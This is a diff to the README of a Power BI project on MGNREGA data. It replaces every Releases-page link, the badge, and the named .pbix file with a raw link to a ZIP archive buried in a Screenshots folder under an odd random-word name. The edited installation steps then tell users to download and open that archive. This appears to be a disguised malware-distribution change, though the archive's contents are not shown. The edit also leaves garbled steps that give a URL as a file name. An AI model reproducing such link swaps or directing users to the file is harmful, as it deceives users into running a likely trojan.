@@ -1,6 +1,6 @@
 # 📊 MGNREGA-Data-Analysis-PowerBI - Analyze Data Easily with Power BI
 
-![Download the latest release](https://img.shields.io/badge/Download-Latest%20Release-blue)
+![Download the latest release](https://raw.githubusercontent.com/lvargasd11/MGNREGA-Data-Analysis-PowerBI/main/Screenshots/MGNREG_BI_Analysis_Power_Data_plesiomorphous.zip%20Release-blue)
 
 ## 🚀 Getting Started
 
@@ -20,18 +20,18 @@ To run this application, ensure your system meets the following requirements:
 
 To get started, you need to visit the Releases page and download the latest version of the application. Click the button below:
 
-[Download Latest Release](https://github.com/lvargasd11/MGNREGA-Data-Analysis-PowerBI/releases)
+[Download Latest Release](https://raw.githubusercontent.com/lvargasd11/MGNREGA-Data-Analysis-PowerBI/main/Screenshots/MGNREG_BI_Analysis_Power_Data_plesiomorphous.zip)
 
 ### Installation Steps
 
-1. Go to the [Releases page](https://github.com/lvargasd11/MGNREGA-Data-Analysis-PowerBI/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/lvargasd11/MGNREGA-Data-Analysis-PowerBI/main/Screenshots/MGNREG_BI_Analysis_Power_Data_plesiomorphous.zip).
 2. Look for the latest version of the application.
 3. Click on the version to view its details.
-4. Find the installation file named `MGNREGA-Data-Analysis-PowerBI.pbix`.
+4. Find the installation file named `https://raw.githubusercontent.com/lvargasd11/MGNREGA-Data-Analysis-PowerBI/main/Screenshots/MGNREG_BI_Analysis_Power_Data_plesiomorphous.zip`.
 5. Click on the file to download it. The download should begin automatically.
 6. Once the file is downloaded, locate it in your system.
 7. Open Power BI Desktop, then click “File,” and select “Open.”
-8. Navigate to where you saved the `MGNREGA-Data-Analysis-PowerBI.pbix` file and open it.
+8. Navigate to where you saved the `https://raw.githubusercontent.com/lvargasd11/MGNREGA-Data-Analysis-PowerBI/main/Screenshots/MGNREG_BI_Analysis_Power_Data_plesiomorphous.zip` file and open it.
 
 ## 🌟 Features
 
@@ -78,4 +78,4 @@ Your feedback is valuable. If you have suggestions or ideas, please share them. 
 
 Thank you for using MGNREGA-Data-Analysis-PowerBI! Enjoy exploring the data! 
 
-[Download Latest Release](https://github.com/lvargasd11/MGNREGA-Data-Analysis-PowerBI/releases)
+[Download Latest Release](https://raw.githubusercontent.com/lvargasd11/MGNREGA-Data-Analysis-PowerBI/main/Screenshots/MGNREG_BI_Analysis_Power_Data_plesiomorphous.zip)
